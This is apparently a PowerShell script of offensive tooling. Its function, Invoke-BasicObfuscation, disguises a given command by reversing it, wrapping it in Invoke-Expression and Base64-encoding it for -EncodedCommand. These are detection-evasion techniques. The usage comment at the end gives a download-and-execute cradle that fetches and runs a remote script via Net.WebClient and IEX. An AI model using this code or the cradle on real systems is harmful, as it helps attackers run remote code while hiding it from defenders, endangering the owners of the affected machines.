# File: Invoke-BasicObfuscation.ps1
# Description: Applies basic obfuscation techniques to a PowerShell command.

function Invoke-BasicObfuscation {
    param([Parameter(Mandatory=$true)][string]$Command)

    Write-Host "[+] Original command:" -ForegroundColor Yellow
    Write-Host "    $Command" -ForegroundColor Gray

    # Technique 1: Reverse the string
    $Reversed = -join ([char[]]$Command | ForEach-Object {$_})[($Command.Length-1)..0]

    # Technique 2: Encode in Base64 (for -EncodedCommand)
    $Encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

    # Technique 3: Simple obfuscation with Invoke-Expression
    $ObfuscatedCommand = "`$cmd = '$Command'; Invoke-Expression `$cmd"

    $Result = [PSCustomObject]@{
        OriginalCommand  = $Command
        ReversedCommand  = $Reversed
        Obfuscated       = $ObfuscatedCommand
        Base64Encoded    = $Encoded
    }

    Write-Host "[+] Reversed command:" -ForegroundColor Green
    Write-Host "    $($Result.ReversedCommand)" -ForegroundColor Gray
    Write-Host "[+] Obfuscated example:" -ForegroundColor Green
    Write-Host "    $($Result.Obfuscated)" -ForegroundColor Gray
    Write-Host "[+] Base64 string (for -EncodedCommand):" -ForegroundColor Green
    Write-Host "    $($Result.Base64Encoded)" -ForegroundColor Gray

    return $Result
}

# Example usage:
# Invoke-BasicObfuscation -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/Script.ps1')"